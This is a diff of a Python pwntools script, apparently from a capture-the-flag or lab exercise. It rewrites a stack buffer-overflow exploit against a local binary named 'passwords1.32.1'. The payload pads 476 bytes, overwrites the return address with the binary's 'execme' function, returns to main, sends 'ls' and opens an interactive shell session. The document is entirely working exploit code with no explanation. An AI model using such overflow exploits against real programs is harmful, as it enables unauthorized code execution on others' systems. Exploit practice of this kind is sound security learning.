@@ -1,19 +1,24 @@
-from pwn import *
+import pwn 
 
-# Creamos un proceso interactivo para la ejecución del programa
-p = process('./passwords1.32.1')  # Reemplaza 'tu_programa' con el nombre de tu programa
+elf = pwn.ELF("./passwords1.32.1.bin")
 
-# Enviamos el primer input
-p.sendline('1')
+offset = 476
 
-# Construimos el payload para la explotación
-payload = b"A" * 476 + p32(0x0804b069)  # Reemplaza 0x0804b069 con la dirección de retorno deseada
+new_eip = pwn.p32(elf.symbols["execme"])
+return_address = pwn.p32(elf.symbols["main"])
 
-# Enviamos el payload
+payload = b"".join(
+  [
+    b"A" * offset,
+    new_eip,
+    return_address
+  ]  
+)
+
+payload += b"\n"
+
+p = elf.process()
+p.sendline(b"1")
 p.sendline(payload)
-
-# Imprimimos la salida recibida del programa (si es necesario)
-print(p.recvall().decode())
-
-# Cerramos el proceso
-p.close()
+p.sendline(b"ls")
+p.interactive()
